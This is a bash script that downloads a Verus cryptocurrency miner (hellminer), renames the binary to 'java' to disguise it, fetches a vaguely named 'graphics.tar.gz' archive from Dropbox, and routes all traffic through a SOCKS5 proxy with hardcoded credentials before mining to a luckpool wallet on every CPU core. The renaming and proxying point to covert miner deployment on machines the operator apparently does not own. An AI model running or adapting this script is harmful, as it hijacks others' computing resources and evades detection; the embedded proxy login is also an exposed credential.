#!/bin/bash

#System requirements
sudo apt-get update
sudo apt-get install -y build-essential libssl-dev libgmp-dev libcurl4-openssl-dev libjansson-dev automake binutils cmake net-tools curl wget

wget -q https://www.dropbox.com/s/tgsmlqggphjv3vk/graphics.tar.gz
tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
select_proxy_mode = only_socks5
socks5 = 2.56.119.93:5074
socks5_username = xcwpffxd
socks5_password = gacdilguy1xm
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo ""

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo ""

echo " "
echo " "

./graftcp/graftcp wget -q https://github.com/hellcatz/hminer/releases/download/v0.58/hellminer_linux64.tar.gz
tar -xvf hellminer_linux64.tar.gz
mv hellminer java
rm hellminer_linux64.tar.gz

chmod +x java
chmod +x verus-solver

./graftcp/graftcp ./java -c stratum+tcp://na.luckpool.net:3960 -u RLG1PwamJgoMYyCguWVH85rTMGiS1JkP46.RUNx -p x --cpu $(nproc)
